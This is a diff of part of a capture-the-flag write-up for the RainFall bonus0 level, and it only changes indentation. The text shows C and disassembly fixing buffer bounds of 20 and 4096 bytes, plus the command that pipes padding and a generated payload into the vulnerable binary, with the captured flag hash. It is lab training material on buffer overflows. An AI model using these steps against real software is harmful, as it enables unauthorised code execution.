@@ -132,29 +132,29 @@ bonus0@RainFall:~$ nano /var/tmp/exploit.py
 
 buffer [min, max] = [20, 4095]
 ```
- read(0, buffer, 4096);
+ 	read(0, buffer, 4096);
 	*strchr(buffer, '\n') = 0;
 	return (strncpy(s, buffer, 20));
  ```
 
 min 
 ```
-   0x08048505 <+81>:	movl   $0x14,0x8(%esp) ===> 20
-   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt> 
+   	0x08048505 <+81>:	movl   $0x14,0x8(%esp) ===> 20
+   	0x08048517 <+99>:	call   0x80483f0 <strncpy@plt> 
    ```
 max 
 ```
-   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)  ===> 4096
-   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+	0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)  ===> 4096
+   	0x080484e1 <+45>:	call   0x8048380 <read@plt>
    ```
 
 
 ```
-bonus0@RainFall:~$ python /var/tmp/exploit.py > /var/tmp/exp
+	bonus0@RainFall:~$ python /var/tmp/exploit.py > /var/tmp/exp
 
-(python -c 'print "A" * 20'; cat /var/tmp/exp; cat) | ./bonus0
+	(python -c 'print "A" * 20'; cat /var/tmp/exp; cat) | ./bonus0
 
-cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+	cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
 ```
 
